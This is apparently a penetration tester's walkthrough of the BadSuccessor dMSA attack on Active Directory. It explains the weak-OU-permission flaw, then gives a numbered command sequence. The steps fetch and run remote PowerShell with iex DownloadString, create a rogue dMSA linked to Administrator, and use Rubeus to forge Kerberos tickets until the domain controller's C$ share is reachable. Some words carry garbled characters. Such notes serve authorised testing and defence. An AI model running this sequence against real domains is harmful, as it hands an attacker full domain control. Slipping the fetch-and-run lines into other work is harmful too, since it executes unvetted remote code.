# Bad Successor dMSA

## Tools: 

https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/112efc20807e14e3c05c2307e3e6816dc4f2b5ef/tools/ActiveDirectory/BadSuccessor.ps1

https://github.com/akamai/BadSuccessor

https://github.com/logangoins/SharpSuccessor

## Prerequisites:

• Windows Server 2019 as Active Directory that supports PKINIT
• Domain must have Ac􀆟ve Directory Certificate Services and Certificate Authority configured.
• Kali Linux packed with tools
• Tools: Rubeus, sharpsuccessor, badsuccessor module

## Explanation

BadSuccessor is a post-compromise privilege escalation technique that targets a new feature in Windows Server 2025: Delegated Managed Service Accounts (dMSAs). This technique takes advantage of vulnerabilities in the dMSA configuration, allowing attackers to escalate their privileges within Ac􀆟ve Directory environments a􀅌er an initial compromise, potentially gran􀆟ng them higher-level access or control over critical systems.

In essence, it exploits:

• Weak ACLs on Organizational Units (OUs): Attackers with low privileges but write rights on an OU can create or modify dMSAs.

• msDS-DelegatedMSAState and msDS-ManagedAccountPrecededByLink: Attributes that allow linking dMSAs to privileged accounts.

• Kerberos quirks: Rogue dMSAs inherit the security context of the linked privileged account, allowing attackers to obtain TGTs and TGSs as Domain Admins.

This attack is particularly dangerous because it allows an attacker with minimal delegated permissions (like write rights on an Organizational Unit (OU)) to:

• Create a rogue dMSA

• Link it to a privileged account (e.g., Domain Admin)

• Obtain Kerberos 􀆟tickets that inherit the target’s security context

• Pivot to full domain control

Unlike attacks that require password cracking or golden ticket creation, BadSuccessor is stealthy, lives entirely within AD’s supported features, and can often bypass detection systems.

## Enumeration and Exploitation

#### 1) Load BadSuccessor and Check for Vulnerabilities

    iex(new-object net.webclient).DownloadString("https://raw.githubusercontent.com/LuemmelSec/Pentest-Tools-Collection/refs/heads/main/tools/ActiveDirectory/BadSuccessor.ps1") 

    BadSuccessor -mode check -Domain domain.local

#### 2) Audit OU Permissions

    iex(new-object net.webclient).DownloadString("https://raw.githubusercontent.com/akamai/BadSuccessor/refs/heads/main/Get-BadSuccessorOUPermissions.ps1")

#### 3) Create Rogue dMSA and link it to Administrator

    BadSuccessor -mode exploit -Path "OU=HACKME,DC=domain,DC=local" -Name "BAD_DMSA" -DelegateAdmin "USER" -DelegateTarget "Administrator" -domain "domain.local"

#### 4) Test access to sensitive resources 

    dir \\dc.domain.local\c$ (Expected access denied)

#### 5) Finalize dMSA Link with SharpSuccessor

    .\SharpSuccessor.exe add /impersonate:Administrator /path:"ou=HACKME,dc=domain,dc=local" /account:USER /name:BAD_DMSA

#### 6) Request delegation TGT with Rubeus

    .\Rubeus.exe tgtdeleg /nowrap

#### 7) Request TGT as BAD_DMSA

    .\Rubeus.exe asktgt /targetuser:BAD_DMSA$ /service:krbtgt/domain.local /opsec /dmsa /nowrap /ptt /ticket:doIFjdCCX...

#### 8) Request Service Ticket for File Server

    .\Rubeus.exe asktgs /user:BAD_DMSA$ /service:cifs/dc.domain.local /opsec /dmsa /nowrap /ptt /ticket:doIFzDCCBigAw...

#### 9) Confirm Domain Admin access

    dir \\dc.domain.local\c$
